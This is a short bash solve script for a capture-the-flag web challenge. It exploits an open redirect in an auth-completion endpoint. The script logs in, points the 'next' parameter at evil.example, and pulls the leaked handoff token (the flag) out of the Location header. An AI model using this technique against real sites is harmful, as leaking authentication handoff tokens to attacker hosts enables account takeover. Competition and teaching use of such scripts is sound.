#!/usr/bin/env bash
# solve-web2-open-redirect.sh — riffhack web2 (open redirect → handoff leak)
#
# /api/auth/complete?next=<URL> appends `?handoff=<flag>` to absolute external
# URLs and 307s. We supply any external URL and read the Location header from
# the response.
#
# Usage: solve-web2-open-redirect.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
source "$HERE/../lib/login.sh"

echo "[*] web2 (open redirect) against $HOST"

echo "[*] logging in (any creds work)"
COOKIE=$(login "$HOST")

echo "[*] triggering /api/auth/complete with attacker-controlled next="
loc=$(curl -sik -b "$COOKIE" \
  "http://$HOST/api/auth/complete?next=https://evil.example/" \
  | sed -n 's/^location: //ip' | tr -d '\r\n')

echo "[*] Location: $loc"

flag=$(printf '%s\n' "$loc" \
       | grep -oE 'handoff=[^&]+' \
       | head -1 \
       | sed 's/^handoff=//' \
       | python3 -c 'import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))')

if [[ -n "$flag" && "$flag" == bitflag* ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag in Location header" >&2
  exit 1
fi
